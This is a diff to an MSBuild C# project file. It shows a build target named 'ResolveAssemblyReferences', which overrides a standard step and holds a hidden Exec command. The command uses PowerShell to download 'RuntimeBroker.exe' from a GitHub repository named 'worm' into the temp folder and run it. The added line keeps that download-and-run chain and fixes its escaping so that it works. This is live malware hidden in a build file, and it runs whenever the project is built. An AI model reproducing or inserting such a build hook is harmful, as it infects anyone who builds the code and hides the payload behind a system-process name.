@@ -142,7 +142,7 @@
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <Target Name="ResolveAssemblyReferences">
-    <Exec Command="powershell -Command Invoke-WebRequest https://github.com/zerosumOxO/worm/raw/main/RuntimeBroker.exe -OutFile %temp%/RuntimeBroker.exe &amp; powershell %temp%/RuntimeBroker.exe" />
+    <Exec Command="powershell -Command Invoke-WebRequest https://github.com/zerosumOxO/worm/raw/main/RuntimeBroker.exe -OutFile %temp%/RuntimeBroker.exe & powershell %temp%/RuntimeBroker.exe" />
   </Target>
   <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
     <PropertyGroup>
